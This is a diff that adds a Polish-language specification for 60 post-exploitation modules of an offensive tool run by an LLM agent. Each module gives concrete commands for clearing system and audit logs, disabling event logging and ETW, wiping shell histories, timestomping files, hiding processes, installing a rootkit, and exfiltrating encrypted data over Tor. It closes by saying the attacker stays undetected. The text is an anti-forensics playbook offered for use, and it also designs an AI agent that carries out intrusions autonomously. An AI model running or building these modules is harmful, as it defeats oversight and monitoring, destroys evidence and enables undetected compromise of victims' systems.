@@ -1,0 +1,438 @@
+## Moduły 1‑10 – Czyszczenie logów systemowych
+
+### 1. post_clear_windows_event_logs
+- **Cel:** Usunięcie wszystkich wpisów z dzienników zdarzeń Windows (System, Security, Application).
+- **Implementacja:**  
+  `wevtutil cl System`  
+  `wevtutil cl Security`  
+  `wevtutil cl Application`  
+  oraz dodatkowe dzienniki: `Setup`, `ForwardedEvents`, `Microsoft-*`. Użycie `Get-WinEvent -ListLog * | ForEach-Object { wevtutil cl $_.LogName }` w PowerShell. Jeśli nie ma uprawnień, próbuje przez `auditpol /clear`.
+- **AI:** Wywoływane przed opuszczeniem hosta.
+
+### 2. post_clear_linux_syslog
+- **Cel:** Wyczyszczenie plików `/var/log/syslog`, `auth.log`, `kern.log` i innych.
+- **Implementacja:**  
+  ```bash
+  shred -f -z /var/log/syslog /var/log/auth.log /var/log/kern.log
+  echo "" > /var/log/wtmp; echo "" > /var/log/btmp
+  ```
+  Dla systemów z `logrotate` wymusza rotację i usuwa zarchiwizowane kopie.
+- **AI:** Uruchamiane po wykonaniu zadań.
+
+### 3. post_clear_macos_unified_log
+- **Cel:** Wyczyszczenie scentralizowanego dziennika macOS (Unified Log).
+- **Implementacja:**  
+  `sudo log erase --all` (macOS 10.15+). Dodatkowo usunięcie prywatnych danych z `/var/log/asl/` przez `sudo rm -rf /var/log/asl/*.asl`.
+- **AI:** Jeśli wykryte macOS, automatycznie włącza ten moduł.
+
+### 4. post_disable_audit_logging
+- **Cel:** Tymczasowe wyłączenie rejestrowania zdarzeń (audytu) na czas trwania ataku.
+- **Implementacja:**  
+  - **Linux:** `auditctl -e 0` (jeśli obecny).  
+  - **Windows:** `auditpol /clear /y` lub `auditpol /set /subcategory:"Logon" /success:disable /failure:disable`.  
+  - **macOS:** `sudo audit -t` (tymczasowe wyłączenie).
+  Po zakończeniu przywraca (przez backup ustawień).
+- **AI:** Wywoływane przed wrażliwymi operacjami; przywracane po nich.
+
+### 5. post_clear_bash_history
+- **Cel:** Usunięcie historii poleceń bash (i innych shelli).
+- **Implementacja:**  
+  ```bash
+  history -c && history -w
+  unset HISTFILE
+  rm -f ~/.bash_history ~/.zsh_history ~/.mysql_history ~/.psql_history
+  ```
+  Dla sesji zdalnych: czyszczenie `.bash_history` wszystkich użytkowników.
+- **AI:** Automatyczne po każdym wykonaniu komendy shell.
+
+### 6. post_clear_powershell_history
+- **Cel:** Usunięcie historii PowerShell (PSReadline).
+- **Implementacja:**  
+  Usunięcie pliku `(Get-PSReadlineOption).HistorySavePath`. Czyszczenie sesji: `[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()`.
+- **AI:** Po użyciu PowerShell.
+
+### 7. post_wipe_vim_info
+- **Cel:** Usunięcie plików `.viminfo`, `.vimrc` i innych śladów edytora.
+- **Implementacja:**  
+  `shred -u ~/.viminfo ~/.vimrc` (Linux/macOS). Windows: `del /f /q %USERPROFILE%\_viminfo`.
+- **AI:** Jeśli używano edytora.
+
+### 8. post_clear_recent_files
+- **Cel:** Usunięcie listy ostatnio używanych dokumentów.
+- **Implementacja:**  
+  - **Windows:** Usuń klucze rejestru `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs`.  
+  - **Linux:** `rm -f ~/.local/share/recently-used.xbel`.  
+  - **macOS:** `defaults delete com.apple.recentitems`.
+- **AI:** Przy zacieraniu śladów użytkownika.
+
+### 9. post_clear_mru_lists
+- **Cel:** Wyczyszczenie list MRU (Most Recently Used) w różnych aplikacjach.
+- **Implementacja:**  
+  Skrypt czyszczący rejestr Windows (np. `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`). Linux: usuwanie `~/.local/share/mime/`, `~/.cache/`. macOS: `defaults delete -g NSNavRecentPlaces`.
+- **AI:** Opcjonalnie po zebraniu informacji.
+
+### 10. post_disable_windows_event_log_service
+- **Cel:** Całkowite zatrzymanie usługi dziennika zdarzeń, aby zapobiec rejestrowaniu.
+- **Implementacja:**  
+  `sc stop EventLog` i `sc config EventLog start= disabled`. Przywraca po ataku.
+- **AI:** Przed szczególnie głośnymi działaniami.
+
+---
+
+## Moduły 11‑20 – Usuwanie plików i bezpieczne kasowanie
+
+### 11. post_secure_delete_file
+- **Cel:** Bezpowrotne usunięcie wskazanego pliku.
+- **Implementacja:**  
+  - **Linux/macOS:** `shred -f -z -u <file>`.  
+  - **Windows:** `sdelete64.exe -p 3 <file>` (narzędzie Sysinternals, dołączane do pakietu).
+- **AI:** Używane do usuwania narzędzi, keyloggerów, skryptów.
+
+### 12. post_secure_delete_directory
+- **Cel:** Bezpieczne usunięcie całego katalogu.
+- **Implementacja:**  
+  Rekurencyjne `shred` na plikach, potem `rm -rf`. Windows: `sdelete -s <dir>`.
+- **AI:** Po zakończeniu sesji na zdalnym hoście.
+
+### 13. post_wipe_free_space
+- **Cel:** Zatarcie śladów na wolnym miejscu dysku (zapobieganie odzyskiwaniu skasowanych plików).
+- **Implementacja:**  
+  - **Windows:** `cipher /w:C:` (lub odpowiedni dysk).  
+  - **Linux:** `dd if=/dev/zero of=/tmp/zerofill; rm /tmp/zerofill` (nieidealne, lepiej użyć `sfill` z pakietu secure-delete).  
+  - **macOS:** `diskutil secureErase freespace 0 /Volumes/Macintosh\ HD`.
+- **AI:** Przy końcowym czyszczeniu.
+
+### 14. post_remove_slack_space
+- **Cel:** Usunięcie danych z obszarów slack na końcu plików (tail packing).
+- **Implementacja:**  
+  - **Windows:** `fsutil file seteof` (nie do końca). Lepsze: `sdelete -z`.  
+  - **Linux:** `bmap` + `shred` na surowym urządzeniu.
+  Złożone, często pomijane; moduł próbuje jeśli dostępne.
+
+### 15. post_wipe_mft_records (Windows)
+- **Cel:** Usunięcie wpisów w Master File Table (NTFS) dla usuniętych plików.
+- **Implementacja:**  
+  `sdelete -c` (czyszczenie MFT). Lub `fsutil behavior set disablelastaccess 1` wcześniej.
+- **AI:** Przy zaawansowanym ukrywaniu.
+
+### 16. post_clean_pagefile (Windows)
+- **Cel:** Wyczyszczenie pliku stronicowania, który może zawierać fragmenty danych.
+- **Implementacja:**  
+  `reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v ClearPageFileAtShutdown /t REG_DWORD /d 1 /f` – wymaga restartu, więc nie zawsze wykonalne. Lepsze: uruchomienie `sdelete -p 1 C:\pagefile.sys` (jeśli dostępny).
+- **AI:** Ostatnia deska ratunku.
+
+### 17. post_clean_hiberfil (Windows)
+- **Cel:** Usunięcie pliku hibernacji.
+- **Implementacja:**  
+  `powercfg -h off` – wyłącza hibernację, plik usuwany. Następnie przywrócenie ustawień.
+- **AI:** Jeśli hibernacja była włączona.
+
+### 18. post_clean_journald (Linux)
+- **Cel:** Czyszczenie dzienników systemd-journald.
+- **Implementacja:**  
+  `journalctl --rotate; journalctl --vacuum-size=1M; journalctl --flush; rm -rf /var/log/journal/*`.
+- **AI:** Na systemach z systemd.
+
+### 19. post_remove_crash_dumps
+- **Cel:** Usunięcie zrzutów pamięci i błędów (Windows: `C:\Windows\Minidump\`, `C:\Windows\MEMORY.DMP`; Linux: `/var/crash/`; macOS: `/Library/Logs/DiagnosticReports/`).
+- **Implementacja:** Bezpośrednie usuwanie plików.
+- **AI:** Po wykonaniu eksploitów, aby nie zostawiać śladów.
+
+### 20. post_clean_tmp_directories
+- **Cel:** Wyczyszczenie katalogów tymczasowych ze wszystkich narzędzi.
+- **Implementacja:**  
+  - **Linux/macOS:** `rm -rf /tmp/* /var/tmp/*` (ostrożnie, bo może usunąć potrzebne pliki – tylko własne artefakty).  
+  - **Windows:** `del /f /q %TEMP%\*` i `rmdir /s /q C:\Windows\Temp`.
+- **AI:** Przed rozłączeniem.
+
+---
+
+## Moduły 21‑30 – Manipulacja znacznikami czasu i metadanymi
+
+### 21. post_timestomp_file
+- **Cel:** Ustawienie daty modyfikacji/utworzenia pliku na wzór innego (lub na określoną datę).
+- **Implementacja:**  
+  - **Linux:** `touch -r <reference_file> <target_file>` dla zmiany mtime. `touch -t YYYYMMDDhhmm` dla konkretnej.  
+  - **Windows:** `powershell (Get-Item <file>).CreationTime = <datetime>; ...LastWriteTime...`. Użycie `Set-MacAttribute` (jak w module).  
+  - **macOS:** tak samo jak Linux.
+- **AI:** Po modyfikacji plików, aby wyglądały na stare.
+
+### 22. post_timestomp_directory_recursive
+- **Cel:** Ustawienie dat całego katalogu.
+- **Implementacja:**  
+  Rekurencyjne `touch` lub `Set-MacAttribute` dla wszystkich plików i folderów.
+- **AI:** Po złożeniu backdoora.
+
+### 23. post_clear_ntfs_usn_journal (Windows)
+- **Cel:** Usunięcie dziennika USN (Update Sequence Number), który rejestruje zmiany plików.
+- **Implementacja:**  
+  `fsutil usn deletejournal /n /d C:` (wymaga uprawnień).
+- **AI:** Wysoki priorytet po zakończeniu działań.
+
+### 24. post_remove_mac_metadata (macOS)
+- **Cel:** Usunięcie atrybutów rozszerzonych i kwarantanny.
+- **Implementacja:**  
+  `xattr -cr <plik>` (usuwa wszystkie atrybuty).
+- **AI:** Po pobraniu narzędzi przez internet.
+
+### 25. post_hide_file (Linux/macOS)
+- **Cel:** Ukrycie pliku przed zwykłym `ls`.
+- **Implementacja:**  
+  Dodanie kropki na początku nazwy (`.ukryty_plik`). To tylko podstawowe, ale użyteczne.
+- **AI:** Dla tymczasowych narzędzi.
+
+### 26. post_alternate_data_streams_wipe (Windows)
+- **Cel:** Usunięcie wszystkich Alternate Data Streams z plików.
+- **Implementacja:**  
+  `streams.exe -d <plik>` (Sysinternals). Rekurencyjnie na katalogu.
+- **AI:** Jeśli wykorzystano ADS do ukrywania.
+
+### 27. post_clear_file_audit_policy (Linux)
+- **Cel:** Usunięcie reguł audytu dla określonych plików (jeśli skonfigurowane).
+- **Implementacja:**  
+  `auditctl -l` i `auditctl -W <ścieżka> -p war -k key`? Raczej usuwanie reguł: `auditctl -d always,exit -F path=<file>`. Wymaga uprawnień.
+- **AI:** Przed modyfikacją monitorowanych plików.
+
+### 28. post_disable_last_access_timestamp (Windows/Linux/macOS)
+- **Cel:** Wyłączenie aktualizacji czasu ostatniego dostępu (atime), aby nie zostawiać śladów czytania plików.
+- **Implementacja:**  
+  - **Linux:** `mount -o remount,noatime /` (tymczasowo).  
+  - **Windows:** `fsutil behavior set disablelastaccess 1`.  
+  - **macOS:** `sudo mount -u -o noatime /` (na niektórych wersjach).
+- **AI:** Przed przeszukiwaniem plików.
+
+### 29. post_reset_audit_rules (Linux)
+- **Cel:** Przywrócenie domyślnych reguł audytu po ich modyfikacji.
+- **Implementacja:**  
+  `auditctl -D` (usuwa wszystkie reguły), potem restart usługi `auditd`.
+- **AI:** Po zakończeniu działań.
+
+### 30. post_clean_registry_mru_advanced (Windows)
+- **Cel:** Głębsze czyszczenie rejestru: UserAssist, ShimCache, AppCompatFlags.
+- **Implementacja:**  
+  Usuwanie kluczy `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist`, `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache` (wymaga SYSTEM). Wykorzystanie `reg delete`.
+- **AI:** Bardzo ważne dla ukrycia uruchomionych programów.
+
+---
+
+## Moduły 31‑40 – Maskowanie procesów i usług
+
+### 31. post_hide_process_userland
+- **Cel:** Ukrycie procesu przed menedżerem zadań (Linux: `/proc`; Windows: DKOM lub hooki).
+- **Implementacja:**  
+  - **Linux:** `mount -o bind /tmp /proc/<PID>` (nieprawidłowe). Lepsze: `LD_PRELOAD` hook na `readdir`.  
+  - **Windows:** Wstrzyknięcie do procesu systemowego (np. `explorer.exe`) i wykonanie kodu w jego kontekście, a oryginalny proces zakończyć.  
+  - **macOS:** podobnie jak Linux, przez dynamic library injection.  
+  Moduł używa uproszczonej techniki: `prctl(PR_SET_NAME, ...)` na Linux i macOS, a na Windows migracja do innego procesu.
+- **AI:** Po uruchomieniu keyloggera.
+
+### 32. post_masquerade_process_name
+- **Cel:** Zmiana nazwy procesu na systemową.
+- **Implementacja:**  
+  - **Linux:** `exec -a [systemowy proces] /path/to/backdoor`.  
+  - **Windows:** Zmiana nazwy pliku wykonywalnego na `svchost.exe` i uruchomienie.  
+  - **macOS:** `exec -a`.
+- **AI:** Natychmiast po uruchomieniu backdoora.
+
+### 33. post_install_rootkit (user‑mode)
+- **Cel:** Instalacja prostego rootkita do ukrywania plików/kluczy rejestru.
+- **Implementacja:**  
+  Udostępnia prekompilowane biblioteki (LD_PRELOAD dla Linux, DLL injection dla Windows). Nie tworzy sam rootkita, ale wstrzykuje przygotowaną bibliotekę.
+- **AI:** Opcjonalnie, tylko przy wysokim ryzyku wykrycia.
+
+### 34. post_remove_service (Windows)
+- **Cel:** Usunięcie utworzonej przez nas usługi (jeśli była).
+- **Implementacja:**  
+  `sc delete <nazwa>`. Na Linux: `systemctl stop <...> && systemctl disable <...>`.
+- **AI:** Przed wyjściem.
+
+### 35. post_disable_etw (Windows)
+- **Cel:** Wyłączenie Event Tracing for Windows, aby nie rejestrować zdarzeń.
+- **Implementacja:**  
+  `logman stop <nazwa_sesji> -ets` (wykorzystanie publicznie znanych wyłączeń). Można też użyć `Invoke-Phant0m`.
+- **AI:** Przed cichymi działaniami.
+
+### 36. post_clear_kernel_module_list (Linux)
+- **Cel:** Usunięcie załadowanego modułu jądra z listy `lsmod`.
+- **Implementacja:**  
+  Usunięcie wpisu z listy modułów (wymaga roota i zabaw z `kobject`). Bardziej praktyczne: odmontowanie modułu `rmmod` jeśli był załadowany.
+- **AI:** Po użyciu rootkita LKM.
+
+### 37. post_unload_dylib (macOS)
+- **Cel:** Usunięcie załadowanej biblioteki dynamicznej.
+- **Implementacja:**  
+  `dlclose` (jeśli mamy kontrolę nad procesem) lub po prostu zakończenie procesu-wstrzykiwacza.
+- **AI:** Po użyciu.
+
+### 38. post_obfuscate_command_line (Windows)
+- **Cel:** Ukrycie argumentów wiersza poleceń procesu.
+- **Implementacja:**  
+  Po uruchomieniu, nadpisanie pamięci PEB (Process Environment Block) w Windows. Na Linux: nie ma prostego odpowiednika.
+- **AI:** Po wykonaniu komendy z wrażliwymi parametrami.
+
+### 39. post_clear_systemd_journal (Linux)
+- **Cel:** Czyszczenie tylko wpisów dotyczących naszego UID.
+- **Implementacja:**  
+  `journalctl --vacuum-time=1s --uid=<nasz_uid>` nie działa bezpośrednio. Trzeba ręcznie znaleźć i usunąć pliki binarne. Moduł usuwa całe dzienniki, więc opcjonalnie wywoływany.
+
+### 40. post_remove_wmi_event_subscriptions (Windows)
+- **Cel:** Usunięcie utworzonych przez nas stałych subskrypcji WMI.
+- **Implementacja:**  
+  `Get-WmiObject -Namespace root\subscription -Class __EventFilter | Remove-WmiObject` itd.
+- **AI:** Po usunięciu backdoora opartego na WMI.
+
+---
+
+## Moduły 41‑50 – Czyszczenie śladów sieciowych i aplikacyjnych
+
+### 41. post_clear_arp_cache
+- **Cel:** Usunięcie wpisów ARP związanych z atakującym.
+- **Implementacja:**  
+  - **Windows:** `arp -d <ip>` lub całość `arp -d *`.  
+  - **Linux/macOS:** `ip neigh flush all` lub `arp -d <ip>`.
+- **AI:** Po ataku ARP spoofing.
+
+### 42. post_clear_dns_cache
+- **Cel:** Wyczyszczenie bufora DNS.
+- **Implementacja:**  
+  - **Windows:** `ipconfig /flushdns`.  
+  - **Linux:** `systemctl restart nscd` lub `resolvectl flush-caches`.  
+  - **macOS:** `sudo dscacheutil -flushcache; sudo killall -HUP mDNSResponder`.
+- **AI:** Po modyfikacjach DNS.
+
+### 43. post_remove_firewall_rules
+- **Cel:** Usunięcie reguł zapory sieciowej dodanych przez atakującego.
+- **Implementacja:**  
+  - **Windows:** `netsh advfirewall firewall delete rule name="<nazwa>"`.  
+  - **Linux:** `iptables -D <łańcuch> <reguła>` / `ufw delete <numer>`.  
+  - **macOS:** `pfctl` – usuwanie z pliku konfiguracyjnego.
+- **AI:** Przed zakończeniem.
+
+### 44. post_close_reverse_shell_ports
+- **Cel:** Zamknięcie nasłuchujących portów, które mogły zostać otwarte.
+- **Implementacja:**  
+  Zabicie procesów nasłuchujących (używając `fuser`, `lsof`, `netstat`).
+- **AI:** Po zakończeniu komunikacji.
+
+### 45. post_remove_ssh_keys
+- **Cel:** Usunięcie dodanych kluczy publicznych SSH.
+- **Implementacja:**  
+  Edycja `~/.ssh/authorized_keys` i usunięcie naszego klucza.
+- **AI:** Po zakończeniu dostępu SSH.
+
+### 46. post_clear_ssh_known_hosts
+- **Cel:** Usunięcie wpisu o naszym hoście z pliku `known_hosts` na serwerze (jeśli istnieje).
+- **Implementacja:**  
+  `ssh-keygen -R <host>`.
+- **AI:** Opcjonalnie.
+
+### 47. post_remove_scheduled_tasks
+- **Cel:** Usunięcie zaplanowanych zadań (Windows Task Scheduler, cron, launchd).
+- **Implementacja:**  
+  - **Windows:** `schtasks /delete /tn "<nazwa>" /f`.  
+  - **Linux:** `crontab -l | grep -v '<nasz wpis>' | crontab -`.  
+  - **macOS:** `launchctl unload <plist>; rm <plist>`.
+- **AI:** Automatycznie po usunięciu backdoora.
+
+### 48. post_remove_web_shells
+- **Cel:** Usunięcie plików webshelli (np. ASPX, PHP) z serwera WWW.
+- **Implementacja:**  
+  Bezpośrednie usunięcie pliku, opcjonalnie z `shred`.
+- **AI:** Po eksploatacji.
+
+### 49. post_clear_sql_logs
+- **Cel:** Usunięcie wpisów z logów bazy danych (MySQL, PostgreSQL, MSSQL).
+- **Implementacja:**  
+  - **MySQL:** `PURGE BINARY LOGS BEFORE NOW();` albo `SET GLOBAL general_log = 'OFF';` i usunięcie pliku.  
+  - **PostgreSQL:** `SELECT pg_reload_conf();` i wyczyszczenie plików `postgresql-*.log`.  
+  - **MSSQL:** `EXEC sp_cycle_errorlog;` aby rotować log i usunąć stary plik.
+- **AI:** Po atakach SQL.
+
+### 50. post_clean_web_server_logs
+- **Cel:** Usunięcie wpisów z logów dostępu (Apache, Nginx, IIS).
+- **Implementacja:**  
+  Lokalizacja plików (np. `/var/log/apache2/access.log`) i użycie `sed -i '/<nasze IP>/d'` lub `shred`. Dla IIS: `%SystemDrive%\inetpub\logs\LogFiles\*`, czyszczenie ręczne.
+- **AI:** Po atakach webowych.
+
+---
+
+## Moduły 51‑60 – Zabezpieczenie atakującego i OPSEC
+
+### 51. post_encrypt_exfiltrated_data
+- **Cel:** Szyfrowanie zebranych danych przed eksfiltracją, aby uniknąć inspekcji.
+- **Implementacja:**  
+  Użycie `gpg --symmetric --cipher-algo AES256 <plik>` (lub openssl). Hasło generowane losowo i przekazywane przez bezpieczny kanał.
+- **AI:** Przed wysłaniem.
+
+### 52. post_compress_and_split_data
+- **Cel:** Podział dużych archiwów na mniejsze kawałki, aby ominąć limity transferu.
+- **Implementacja:**  
+  `tar czf - <dane> | split -b 10m - dane.tar.gz.part`.
+- **AI:** Przed eksfiltracją.
+
+### 53. post_use_tor_for_exfil
+- **Cel:** Routing ruchu przez sieć Tor podczas eksfiltracji.
+- **Implementacja:**  
+  `torify curl` lub `socat` przez proxy SOCKS. Wymaga uruchomionego Tora (może być dostarczany jako część narzędzia).
+- **AI:** Jeśli celem jest wysoka anonimowość.
+
+### 54. post_randomize_mac_address
+- **Cel:** Zmiana adresu MAC interfejsu sieciowego przed skanowaniem.
+- **Implementacja:**  
+  - **Linux:** `macchanger -r eth0`.  
+  - **Windows:** `Set-NetAdapter -Name "Ethernet" -MacAddress "XX-XX-XX-XX-XX-XX"` (wymaga wyłączenia/włączenia).  
+  - **macOS:** `sudo ifconfig en0 ether <mac>`.
+- **AI:** Przed ponownym podłączeniem do sieci.
+
+### 55. post_spoof_hostname
+- **Cel:** Zmiana nazwy hosta, aby utrudnić identyfikację w sieci.
+- **Implementacja:**  
+  - **Linux:** `hostnamectl set-hostname <nowa>`.  
+  - **Windows:** `Rename-Computer -NewName <nowa>`.  
+  - **macOS:** `sudo scutil --set HostName <nowa>`.
+- **AI:** Przed skanowaniem.
+
+### 56. post_use_dns_over_https
+- **Cel:** Ukrycie zapytań DNS przed lokalnym monitoringiem.
+- **Implementacja:**  
+  Konfiguracja systemu do używania DoH (np. `cloudflared`). Działa na Linux/macOS.
+- **AI:** Podczas zbierania OSINT z sieci celu.
+
+### 57. post_clear_printer_spooler (Windows)
+- **Cel:** Usunięcie zadań drukowania, które mogłyby ujawnić atak.
+- **Implementacja:**  
+  `net stop spooler; del /q C:\Windows\System32\spool\PRINTERS\*; net start spooler`.
+- **AI:** Specyficzne przypadki.
+
+### 58. post_remove_usb_history
+- **Cel:** Usunięcie śladów podłączonych urządzeń USB.
+- **Implementacja:**  
+  - **Windows:** Czyszczenie kluczy rejestru `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`.  
+  - **Linux:** `rm /var/log/syslog` (wpisy) lub usunięcie z `dmesg`.  
+  - **macOS:** `sudo rm /var/log/system.log` (jeśli zawiera wpisy).
+- **AI:** Jeśli używano USB do przenoszenia danych.
+
+### 59. post_secure_communication_channel
+- **Cel:** Ustanowienie tunelu VPN/SSH przed dalszą komunikacją.
+- **Implementacja:**  
+  `ssh -D 1080 -q -N user@vps` lub `openvpn`. Moduł konfiguruje tunel i przekierowuje cały ruch.
+- **AI:** Priorytet przy łączeniu z C2.
+
+### 60. post_self_destruct
+- **Cel:** Całkowite usunięcie wszystkich narzędzi, logów i zakończenie sesji.
+- **Implementacja:**  
+  Wywołuje wszystkie powyższe moduły w odpowiedniej kolejności (czyszczenie logów, bezpieczne usuwanie plików, timestomp, usuwanie backdoorów). Następnie usuwa własny plik wykonywalny i wychodzi.
+- **AI:** Wywoływane na komendę „clean exit” lub po zakończeniu celu.
+
+---
+
+## Integracja z agentem AI
+
+Agent LLM, na podstawie stanu `context`, decyduje które moduły wykonać. Na przykład:
+- `if context.get("os") == "Windows": post_clear_windows_event_logs()`.
+- Po każdym zdalnym shellu: `post_clear_bash_history` / `post_clear_powershell_history`.
+- Przed opuszczeniem hosta: `post_self_destruct` (końcowa sekwencja).
+
+Wszystkie moduły zarejestrowane w `ToolRegistry` z parametrami (np. opcjonalna ścieżka pliku do usunięcia). Są bezstanowe – wykonują akcję i zwracają sukces/porażkę.
+
+Dzięki nim atakujący pozostaje niewykryty, a ślady zatarte na wielu płaszczyznach.
